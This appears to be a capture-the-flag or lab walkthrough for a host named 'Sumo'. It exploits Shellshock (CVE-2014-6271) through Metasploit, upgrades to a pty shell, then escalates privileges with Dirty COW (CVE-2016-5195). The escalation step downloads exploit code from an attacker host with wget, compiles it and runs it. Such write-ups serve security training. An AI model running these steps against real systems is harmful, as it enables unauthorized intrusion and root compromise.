# Sumo

**IP Address:** 192.168.76.87

## Enumeration
### Open Ports
| Port #| Service | Details  |
|:------|:---------|:---------|
| 22    | ssh      | OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) |
| 80    | http      | Apache httpd 2.2.22 ((Ubuntu)) |

## Exploitation
### Exploit Details (Metasploit)
* **Name** - Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
* **CVE** - 2014-6271
* **Module** - exploit/multi/http/apache_mod_cgi_bash_env_exec
* **Disclosed** - 2014-09-24
* **References**
  * https://cvedetails.com/cve/CVE-2014-6271/
  * https://cvedetails.com/cve/CVE-2014-6278/
  * https://cwe.mitre.org/data/definitions/94.html                                                                                       
  * https://www.exploit-db.com/exploits/34765
  * https://access.redhat.com/articles/1200223
  * https://seclists.org/oss-sec/2014/q3/649


### Process

**Set Metasploit Options**

![Set Options](images/exploit1.png)

**Execute Exploit**

Commands
```bash
run
shell
python -c 'import pty;pty.spawn("/bin/bash")'
id
cat local.txt
ifconfig
```
![Execute Exploit](images/exploit2.png)

## Privilege Escalation
### Exploit Details (SearchSploit)
* **Name** - Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)
* **CVE** - 2016-5195
* **Exploit** - linux/local/40616.c
* **Disclosed** - 2016-10-21
* **References**
  * https://nvd.nist.gov/vuln/detail/CVE-2016-5195

Commands
```
cd /tmp
export lhost=192.168.49.76
wget http://$lhost/linux/exploits/kernel/c0w_64.c
gcc -pthread c0w_64.c  -o c0w_64
./c0w_64
/usr/bin/passwd
id
cat /root/proof
ifconfig
```
![Execute Exploit](images/privesc1.png)
![Execute Exploit](images/privesc2.png)

